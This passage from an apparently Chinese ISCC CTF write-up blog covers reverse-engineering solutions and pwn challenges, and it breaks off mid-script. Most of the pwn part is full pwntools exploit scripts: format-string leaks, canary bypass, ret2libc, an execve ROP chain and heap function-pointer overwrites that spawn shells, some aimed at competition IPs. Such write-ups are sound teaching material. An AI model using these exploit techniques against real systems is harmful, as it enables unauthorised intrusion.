class="variable language_">this</span>.<span class="title class_">GetTime</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;GetTime ret value is &#x27;</span> + ret);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1055853128000&quot;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="擂台题-3"><a href="#擂台题-3" class="headerlink" title="擂台题"></a>擂台题</h3><h4 id="上春山"><a href="#上春山" class="headerlink" title="上春山"></a>上春山</h4><p>附件下载下来是一个apk</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcfb3dda7.png" alt="image-20240525132020469"></p><p>但是jadx打开出来不行</p><p>这里我们需要把它改成zip</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcfb3bd77.png" alt="image-20240525132301889"></p><p>在里面找到一个.so文件</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcfb2f765.png" alt="image-20240525132453208"></p><p>IDA打开</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcfb88ddf.png" alt="image-20240525132525771"></p><p>研究了一下</p><p>写了个脚本</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> *v4; <span class="comment">// r14</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *v3 = <span class="string">&quot;999&quot;</span>; <span class="comment">// 手动给 v3 赋值为 &quot;999&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;999&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        v4 = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">1</span>]; <span class="comment">// 使用 new 分配内存</span></span><br><span class="line">        <span class="type">char</span> v5 = <span class="built_in">strlen</span>(v3); <span class="comment">// 使用 strlen 获取字符串长度</span></span><br><span class="line">        *v4 = v5 + <span class="built_in">strlen</span>(<span class="string">&quot;dtJFkgiuTWcFBdgeGh&quot;</span>) + <span class="number">5</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(v4, <span class="string">&quot;flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(v4, v3);</span><br><span class="line">        <span class="built_in">strcat</span>(v4, <span class="string">&quot;dtJFkgiuTWcFBdgeGh&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出拼接后的字符串</span></span><br><span class="line">        std::cout &lt;&lt; v4 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 释放动态分配的内存</span></span><br><span class="line">        <span class="keyword">delete</span>[] v4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fcfb33992.png" alt="image-20240525132746110"></p><h4 id="EzArd"><a href="#EzArd" class="headerlink" title="EzArd"></a>EzArd</h4><p>jadx打开</p><p>看到这段代码是将时间流转换成字符流</p><p>调试</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcfb9caf5.png" alt="image-20240525152122474"></p><p>动态调试得</p><p>字符串 3SRNH1pdcta4283rFzAHxvZOLjIizbJ64UFx</p><p>加密：异或、换位、base64换表</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcfc1c997.png" alt="image-20240525152231525"></p><p>然后逐位爆破输出解密字符串</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 Base58 字符集</span></span><br><span class="line">BASE58_ALPHABET = <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 待解码的消息</span></span><br><span class="line">ENCODED_MESSAGE = <span class="string">&quot;3SRNH1pdcta4283rFzAHxvZOLjIizbJ64UFx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化解码结果列表，长度与原消息相同</span></span><br><span class="line">decoded_results = [<span class="string">&quot;1&quot;</span>] * <span class="built_in">len</span>(ENCODED_MESSAGE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base58_to_decimal</span>(<span class="params">encoded_string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将 Base58 编码的字符串转换为其十进制表示。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    base = <span class="number">58</span></span><br><span class="line">    decimal_value = <span class="number">0</span></span><br><span class="line">    power = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">reversed</span>(encoded_string):</span><br><span class="line">        digit = BASE58_ALPHABET.index(char)</span><br><span class="line">        decimal_value += digit * (base ** power)</span><br><span class="line">        power += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> decimal_value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历偏移量 k，尝试解码</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 重新初始化解码结果列表，避免之前迭代的影响</span></span><br><span class="line">        decoded_chars = [<span class="string">&quot;1&quot;</span>] * <span class="built_in">len</span>(ENCODED_MESSAGE)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 解码过程</span></span><br><span class="line">        <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(ENCODED_MESSAGE):</span><br><span class="line">            <span class="keyword">if</span> char.isdigit():</span><br><span class="line">                decoded_chars[index] = char</span><br><span class="line">            <span class="keyword">elif</span> char.islower():</span><br><span class="line">                decoded_chars[index] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="number">97</span> + offset) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">            <span class="keyword">elif</span> char.isupper():</span><br><span class="line">                decoded_chars[index] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="number">65</span> + offset) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 合并解码后的字符列表为字符串</span></span><br><span class="line">        modified_message = <span class="string">&quot;&quot;</span>.join(decoded_chars)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 转换为十进制并尝试打印解码结果</span></span><br><span class="line">        <span class="built_in">print</span>(offset, long_to_bytes(base58_to_decimal(modified_message)))</span><br><span class="line">    <span class="keyword">except</span> ValueError:  <span class="comment"># 更具体的异常处理，当字符不在 BASE58 集合中时抛出</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fcfbec300.png" alt="image-20240525152433984"></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="练武题-4"><a href="#练武题-4" class="headerlink" title="练武题"></a>练武题</h3><h4 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h4><p>先看看这个程序是个怎么个事</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd2594713.png" alt="image-20240525015440133"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fd24db6aa.png" alt="image-20240525015500714"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fd25c14c6.png" alt="image-20240525015515551"></p><p>用IDA打开康康呢</p><p>发现存在system函数</p><p>是在sub_400C8A函数进行调用的</p><p>跟进一下看看</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd2505b67.png" alt="image-20240525015630200"></p><p>这样思路就很清楚了</p><p>开始申请又释放了一个chunk(ptr)，后面又申请了一个v1的chunk，又将释放的chunk和Flag进行了对比，如果相等则会执行后门函数，申请的chunk大小可控，如果大小为第一个chunk的大小然后发送Flag为其内容即可获得shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;xxxx&quot;</span>,[port])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choice&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Chunk size&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;104&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;Flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fd245418a.png" alt="image-20240525015811626"></p><h4 id="ISCC-easy"><a href="#ISCC-easy" class="headerlink" title="ISCC_easy"></a>ISCC_easy</h4><p>IDA打开看看</p><p>发现存在字符串漏洞</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd25a4f25.png" alt="image-20240525020053482"></p><p>简单看看</p><p>如果在 printf 函数中，如果字符串 s 中包含格式化字符串</p><p>可以控制输入的格式化字符串来达到读取或修改内存的目的</p><p>而没有binsh、system函数 证明我们需要自己构造</p><p>可以通过libc基址进行计算</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;xxxx&#x27;</span>,[port])</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6-i386_2.31-0ubuntu9.14_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Let&#x27;s have fun!\n&quot;</span>)</span><br><span class="line">x = <span class="number">0x804C030</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>, &#123;x: <span class="number">5</span>&#125;) + <span class="string">b&#x27;%15$p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">libcbase = libc_addr - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">0XF5</span></span><br><span class="line">log.info(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x90</span> + <span class="number">0x4</span>) + p32(system) + p32(<span class="number">0x0</span>) + p32(str_bin_sh)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fd2452fd5.png" alt="image-20240525020427652"></p><h4 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h4><p>IDA打开</p><p>发现func函数</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd25acdbc.png" alt="image-20240525020639276"></p><p>研究一下</p><p>发现有一个溢出和fmt漏洞</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd23d8ee6.png" alt="image-20240525020717035"></p><p>并且 还有后面函数</p><p>所以思路就很清楚了</p><p>先用fmt漏洞使泄露出canary和elf地址  接着就是ret2text</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;xxxx&#x27;</span>,[port])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./easyshell&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">pay=<span class="string">b&#x27;flagisaaa%15$p%17$p&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">pie=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1422</span>-<span class="number">254</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">pay=(<span class="string">b&#x27;exit&#x27;</span>).ljust(<span class="number">0x38</span>)+p64(canary)*<span class="number">2</span>+p64(pie+<span class="number">0x1291</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fd25927e7.png" alt="image-20240525021237719"></p><h4 id="miao"><a href="#miao" class="headerlink" title="miao"></a>miao</h4><p>IDA打开</p><p>简单审计后 发现有格式化字符串漏洞</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd23ea8df.png" alt="image-20240525021623711"></p><p>并且还有栈溢出</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd258aad6.png" alt="image-20240525021707291"></p><p>所以：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&quot;./miao&quot;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;xxxx&quot;</span>,[port])</span><br><span class="line">io.recvuntil(<span class="string">b&quot;?\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;%31$p&quot;</span>) </span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">eax=<span class="number">0x080b8666</span></span><br><span class="line">ebx_edx=<span class="number">0x0806f309</span></span><br><span class="line">ecx=<span class="number">0x080def3d</span></span><br><span class="line">bin_sh=<span class="number">0x80BB7C8</span></span><br><span class="line">int_80=<span class="number">0x0806cf83</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x64</span>+p32(canary)</span><br><span class="line">payload=payload.ljust(<span class="number">0x74</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload+=p32(eax)+p32(<span class="number">0xb</span>)+p32(ebx_edx)+p32(bin_sh)+p32(<span class="number">0</span>)+p32(ecx)+p32(<span class="number">0</span>)+p32(int_80)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fd24592e6.png" alt="image-20240525021808233"></p><h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p>IDA打开发现使格式化字符串</p><p>看看怎么个事</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd25206e9.png" alt="image-20240525022044106"></p><p>所以 我们通过格式化字符串泄露找到libc地址</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd2496cea.png" alt="image-20240525022206320"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">x=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请选择模式\n1:远程攻击\n2:本地攻击\n3:exp调试\n&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">    r=remote(<span class="string">&quot;xxxx&quot;</span>,[port])</span><br><span class="line">    context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> x == <span class="number">2</span> :</span><br><span class="line">    r=process(<span class="string">&quot;./iscc/attachment-13&quot;</span>)</span><br><span class="line">    context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> x == <span class="number">3</span>:</span><br><span class="line">    r=gdb.debug(<span class="string">&quot;./iscc/attachment-12&quot;</span>,gdbscript=<span class="string">&quot;b *0x804940c&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./iscc/attachment-12&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc/ret2-csu-libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">back=<span class="number">0x804931b</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;what&#x27;s the content?\n&quot;</span>,<span class="string">&#x27;%19$p&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your answered:\n&quot;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(r.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary------&gt;&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(canary)))</span><br><span class="line">p=flat(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>),canary,<span class="string">b&#x27;aaaa&#x27;</span>,canary,<span class="string">b&#x27;aaaa&#x27;</span>,puts_plt,back,<span class="number">1</span>,puts_got,<span class="number">8</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,p)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr-------&gt;&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(write_addr)))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"><span class="comment"># libc_base=write_addr-libc.symbols[&#x27;write&#x27;]</span></span><br><span class="line">system=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p=flat(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>),canary,<span class="string">b&#x27;aaaa&#x27;</span>,canary,<span class="string">b&#x27;aaaa&#x27;</span>,system,<span class="string">&#x27;aaaa&#x27;</span>,sh) </span><br><span class="line">r.sendline(p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="Your-program"><a href="#Your-program" class="headerlink" title="Your_program"></a>Your_program</h4><p>简单看看这个程序</p><p>发现</p><p>程序是先进行认证，如果输入的key的第28位为A则通过验证，然后程序申请了一个堆块，o 位置处指针指向该堆块data域，这个堆块地址<code>+3*8</code>以及地址<code>+4*8</code>位置有函数指针，该堆块地址处存一个 我们输入的长度最大为24的name。然后提供了一个菜单，循环执行，当选择功能4的时候程序会询问你 是否真的要退出，如果输入y，则下一次循环结束后结束程序；如果输入$，则在下一次循环后释放o指向 的堆块。</p><p>所以</p><p>IDA打开：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd24e4d0d.png" alt="image-20240525022703014"></p><p>用gets函数读取，存在栈溢出</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd2542918.png" alt="image-20240525022745908"></p><p>格式化字符串漏洞</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd2592ccb.png" alt="image-20240525022804786"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置架构和日志级别</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到远程进程</span></span><br><span class="line"><span class="comment"># p = process(&quot;./your_program&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;182.92.237.102&quot;</span>, <span class="number">10032</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载ELF文件以获取符号信息</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./your_program&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义辅助函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_address</span>(<span class="params">p, num_bytes=<span class="number">6</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Leak memory address by receiving data until &#x27;\x7f&#x27; is encountered.&quot;&quot;&quot;</span></span><br><span class="line">    data = p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> u64(data[-num_bytes:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 地址定义</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401763</span></span><br><span class="line">ret_address = <span class="number">0x000000000040101a</span></span><br><span class="line">main_address = <span class="number">0x00000000004014C8</span></span><br><span class="line">auth_address = <span class="number">0x000000000040127A</span>  <span class="comment"># Overflow detected here</span></span><br><span class="line">overflow_variable = <span class="number">0x0000000000403668</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造利用key</span></span><br><span class="line">key_payload = <span class="string">b&quot;A&quot;</span>*<span class="number">32</span> + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(printf_got) + p64(puts_plt) + p64(main_address)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter key:&quot;</span>, key_payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取printf地址</span></span><br><span class="line">printf_leaked = leak_address(p)</span><br><span class="line">log.info(<span class="string">f&quot;printf address: <span class="subst">&#123;<span class="built_in">hex</span>(printf_leaked)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算libc基址</span></span><br><span class="line">libc_base = printf_leaked - <span class="number">0x061c90</span></span><br><span class="line">system_address = libc_base + <span class="number">0x052290</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备格式化字符串攻击</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit_format_string</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Send payload to trigger format string vulnerability.&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除操作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_app</span>(<span class="params">choice=<span class="string">b&#x27;n&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Option to clear or stay in the app.&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Are you sure you want to exit? (y/n)&quot;</span>, choice)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Request heap allocation</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_heap_allocation</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Request heap allocation and write content.&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Offset calculation and initial key setup</span></span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">initial_key = <span class="string">b&quot;A&quot;</span>*<span class="number">28</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter key:&quot;</span>, initial_key)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to ISCC, tell me your name:&quot;</span>, <span class="string">b&quot;hacker&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leaking heap base address</span></span><br><span class="line">format_payload = <span class="string">b&quot;%7$s&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\xff&#x27;</span>) + p64(overflow_variable)</span><br><span class="line">exploit_format_string(format_payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;hello hack\n&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\xff&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">f&quot;Heap base: <span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clearing app state</span></span><br><span class="line">clear_app(<span class="string">b&#x27;\x24&#x27;</span>)</span><br><span class="line">clear_app()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare for system call</span></span><br><span class="line">request_heap_allocation(p64(<span class="number">0</span>)*<span class="number">3</span> + p64(system_address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite heap to redirect flow</span></span><br><span class="line">overwrite_payload = <span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x3024</span>&#125;</span>c%9$hn&quot;</span>.encode().ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\xff&#x27;</span>) + p64(heap_base)</span><br><span class="line">exploit_format_string(overwrite_payload)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># Interactive shell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fd24602d6.png" alt="image-20240525023134915"></p><h4 id="ISCC-U"><a href="#ISCC-U" class="headerlink" title="ISCC_U"></a>ISCC_U</h4><p>ida打开</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd2476dc5.png" alt="image-20240525023237972"></p><p>申请堆块</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd256e25e.png" alt="image-20240525023308186"></p><p>打印为note赋的值</p><p>同样</p><p>system和binsh的地址通过计算Libc基址来获取</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;182.92.237.102&#x27;</span>, <span class="number">10016</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6-i386_2.31-0ubuntu9.14_amd64.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">Size, Content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;size&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(Size), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Content&#x27;</span>)</span><br><span class="line">    p.send(Content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span 